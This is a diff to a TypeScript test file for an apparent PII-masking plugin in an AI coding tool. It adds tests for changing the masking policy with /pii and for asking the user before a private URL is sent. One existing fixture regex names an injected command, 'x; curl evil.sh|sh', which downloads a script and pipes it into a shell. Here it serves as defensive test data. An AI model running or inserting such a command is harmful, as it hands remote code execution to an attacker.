@@ -26,10 +26,11 @@ const SECRETS: ReadonlyArray<[RegExp, string]> = [
   [/\bJohn\b/g, 'PERSON'],
   [/Mary Ann/g, 'PERSON'],
   [/x; curl evil\.sh\|sh/g, 'SECRET'],
+  [/https:\/\/docs\.acme\.io\/\S*/g, 'PRIVATE_URL'],
 ];
 
 const SECRET_HEADER = 'x-nullpii-session-secret';
-const PLACEHOLDER_ANY = /\{\{PII_[A-Z]+_\d+_[0-9a-f]{16}\}\}/g;
+const PLACEHOLDER_ANY = /\{\{PII_[A-Z_]+?_\d+_[0-9a-f]{16}\}\}/g;
 /** Shell tools, as the gateway names them: their input gets no value. */
 const SHELL_TOOLS = [
   'Bash',
@@ -55,6 +56,8 @@ function fakeSidecar(
     impostor?: boolean;
     /** The policy file the status reports. */
     policyFile?: string;
+    /** The mode of each category the status reports. */
+    categories?: Record<string, string>;
   } = {},
 ) {
   const restoreTools = opts.restoreTools ?? DEFAULT_RESTORE_TOOLS;
@@ -73,6 +76,9 @@ function fakeSidecar(
   const restoreBodies: string[] = [];
   /** Set it to make `/sanitize` and `/restore` answer this text, not JSON. */
   const state: { garbage?: string } = {};
+  // The policy the status reports, which a PUT replaces as the gateway does.
+  const policy = { config: {} as Record<string, unknown>, categories: opts.categories ?? {} };
+  const policyBodies: unknown[] = [];
   /** Every `$.ui.log` line the mod wrote. */
   const logs: string[] = [];
   /** The status of every answer. */
@@ -157,12 +163,25 @@ function fakeSidecar(
         return respond(204, undefined);
       }
     }
+    const policyView = () => ({
+      file: opts.policyFile ?? POLICY_FILE,
+      loaded: true,
+      config: policy.config,
+      categories: policy.categories,
+      restoreTools,
+    });
     if (path === '/v1/sidecar/status') {
-      return respond(200, {
-        status: 'ok',
-        sessions: 1,
-        policy: { file: opts.policyFile ?? POLICY_FILE, loaded: true, config: {}, restoreTools },
-      });
+      return respond(200, { status: 'ok', sessions: 1, policy: policyView() });
+    }
+    if (path === '/v1/sidecar/policy' && method === 'PUT') {
+      const { config } = JSON.parse(e.init?.body ?? '{}') as { config: Record<string, unknown> };
+      policyBodies.push(config);
+      policy.config = config;
+      policy.categories = {
+        ...policy.categories,
+        ...((config.categories as Record<string, string> | undefined) ?? {}),
+      };
+      return respond(200, { status: 'ok', policy: policyView() });
     }
     const body = JSON.parse(e.init?.body ?? '{}') as { value: unknown; tool?: string };
     if (path.endsWith('/restore')) restoreBodies.push(e.init?.body ?? '');
@@ -210,6 +229,7 @@ function fakeSidecar(
     hosts,
     logs,
     restoreBodies,
+    policyBodies,
     secretsSent,
     sessions,
     state,
@@ -653,7 +673,7 @@ test('/pii shows the policy the sidecar runs with', async ($, on) => {
   const answer = await $.command.run({ command: 'pii', args: '' });
   expect(answer.text).toContain(`Policy file: ${POLICY_FILE} (loaded)`);
   expect(answer.text).toContain('Tools that get real values back: Read, Edit');
-  expect(answer.text).toContain('apply when nullpii-gateway restarts');
+  expect(answer.text).toContain('Change it with /pii');
 });
 
 test('a call that may change the policy file is put to the user', async ($, on) => {
@@ -994,4 +1014,84 @@ test('a process that cannot prove the token gets neither the token nor the promp
   expect(sidecar.tokensSent.every((sent) => !sent)).toBe(true);
   const status = await $.command.run({ command: 'pii', args: '' });
   expect(status.text).toContain('did not prove it holds the sidecar token');
+});
+
+test('/pii changes the policy through the sidecar: a preset, a mode, a reset', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  await start($);
+
+  const secrets = await $.command.run({ command: 'pii', args: 'preset secrets' });
+  expect(secrets.text).toContain('Policy changed.');
+  const presetConfig = sidecar.policyBodies[0] as { categories: Record<string, string> };
+  expect(presetConfig.categories.secret).toBe('mask');
+  expect(presetConfig.categories.private_person).toBe('off');
+
+  await $.command.run({ command: 'pii', args: 'ask url email' });
+  expect(sidecar.policyBodies[1]).toEqual({
+    categories: { ...presetConfig.categories, private_url: 'ask', private_email: 'ask' },
+  });
+
+  await $.command.run({ command: 'pii', args: 'reset' });
+  expect(sidecar.policyBodies[2]).toEqual({});
+});
+
+test('/pii answers an unknown argument with its usage and changes nothing', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  await start($);
+
+  const answer = await $.command.run({ command: 'pii', args: 'mask pets' });
+
+  expect(answer.text).toContain('Unknown category "pets"');
+  expect(sidecar.policyBodies).toEqual([]);
+});
+
+/** Answer the mod's mask dialog with `label`, recording each question. */
+function answerDialog(on, label: string, questions: string[]) {
+  on('tool.call', { tool: 'AskUserQuestion' }, ($, e) => {
+    const question = e.questions[0]?.question ?? '';
+    questions.push(question);
+    return { result: { questions: e.questions, answers: { [question]: label } } };
+  });
+}
+
+test('a value of an `ask` category in the prompt is put to the user first: sent readable on request', async ($, on) => {
+  const sidecar = fakeSidecar({ categories: { private_url: 'ask' } });
+  stubSession(on, sidecar);
+  const sent: string[] = [];
+  const questions: string[] = [];
+  answerDialog(on, 'Send readable', questions);
+  on('prompt.submit', ($, e) => {
+    sent.push(e.text);
+    return { text: e.text };
+  });
+  await start($);
+
+  await $.prompt.submit({
+    text: 'read https://docs.acme.io/guide for John',
+    wait: false,
+    origin: COMPOSER,
+  });
+
+  expect(questions[0]).toContain('url "https://docs.acme.io/guide"');
+  expect(sent).toEqual([`read https://docs.acme.io/guide for ${ph('PERSON', 0)}`]);
+});
+
+test('an `ask` value stays masked when the user says so, and "Always readable" changes the policy', async ($, on) => {
+  const sidecar = fakeSidecar({ categories: { private_url: 'ask' } });
+  stubSession(on, sidecar);
+  const sent: string[] = [];
+  const questions: string[] = [];
+  answerDialog(on, 'Always readable', questions);
+  on('prompt.submit', ($, e) => {
+    sent.push(e.text);
+    return { text: e.text };
+  });
+  await start($);
+
+  await $.prompt.submit({ text: 'see https://docs.acme.io/a', wait: false, origin: COMPOSER });
+
+  expect(sent).toEqual(['see https://docs.acme.io/a']);
+  expect(sidecar.policyBodies).toEqual([{ categories: { private_url: 'off' } }]);
 });
